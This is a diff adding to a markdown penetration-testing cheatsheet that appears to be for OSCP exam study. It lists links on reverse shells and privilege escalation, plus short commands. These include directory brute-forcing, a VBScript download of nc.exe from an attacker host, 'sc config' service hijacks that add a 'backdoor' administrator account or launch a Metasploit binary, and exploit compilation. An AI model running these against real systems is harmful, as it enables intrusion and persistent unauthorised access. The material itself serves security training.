@@ -108,6 +108,14 @@ __MSRPC (135)__
 
 ## Web
 
+```
+# Follow re-directs
+$ curl -i -L 10.11.1.71 
+
+# Directory brute-force
+$ gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+
+
 Denied from accessing /robots.txt?
 * Try change the user agent i.e. `curl -v http://10.11.1.39/robots.txt -H "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"`
 
@@ -162,6 +170,13 @@ PHP
 Reverse shell cheatsheet:
 * http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/
 
+Metasploit reverse shell payloads:
+* http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
+
+If reverse shell hangs / dies:
+* Try a different port, try a different port. E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).
+* A firewall may be blocking / disconnecting you on the port.
+* Try a bind shell instead of reverse shell.
 
 ## Kernel Exploits
 
@@ -169,6 +184,30 @@ FreeBSD 9.0
 * FreeBSD 9.0 - Intel SYSRET: https://www.exploit-db.com/exploits/28718
 
 ## Privilege Escalation
+
+Quick Wins:
+```bash
+# THIS HAS WORKED BEFORE: Due to misconfiguration in /etc/sudoers
+$ sudo su	# execute su as root
+$ su root	# become root
+```
+
+General privesc guide:
+* https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/?st=JOQAMPYP&sh=8899be73
+
+Linux privesc:
+* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py (automated - suggests exploits)
+* https://github.com/rebootuser/LinEnum (automated)
+* https://tools.kali.org/vulnerability-analysis/unix-privesc-check (automated - Kali)
+* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (manual)
+
+Windows privesc:
+* Automated scanner: https://github.com/azmatt/windowsEnum (automated)
+* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+* https://github.com/xapax/security/blob/master/privilege_escalation_windows.md
+* https://guif.re/windowseop?fbclid=IwAR0jmCV-uOLaUJCnKiGB2ZaDt9XZwlAGM3nTOH0GkS6c0hS63FFSGm97Tdc#Windows%20version%20map
+* http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+
 
 TTY spawn cheatsheet: https://netsec.ws/?p=337
 
@@ -197,21 +236,42 @@ Psexec.exe:
 Net Use:
 * https://www.robvanderwoude.com/ntadmincommands.php#Cmd15
 
+Windows file transfer methods:
+```vbs
+# Copy/paste into Windows shell: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
+# Run:
+$ cscript wget.vbs http://10.11.0.42/nc.exe
+```
+Vulnerable services:
+```powershell
+# Vulnerable services
+sc qc <vulnerable service name>
+sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
+sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
 
-## Reverse Shell Tips
+sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
+net start <vulnerable-service>
+```
 
-Reverse shell cheatsheet: http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
-
-If reverse shell hangs / dies, try a different port.
-* A firewall may be blocking / disconnecting you on the port.
-* E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).
-
-
-## Metasploit
+## Msfvenom payloads
 
 Msfvenom commands:
 * https://netsec.ws/?p=331
 
 
+### Compiling exploit code
+
+Compilation tips:
+* `./exploit` results in errors: compile in the host itself, Kali box or another machine.
+
+Compilation commands:
+```bash
+# Linux
+$ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit
+
+# Windows (cross-compile) and run
+$ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
+$ wine exploit.exe
+```
 
 
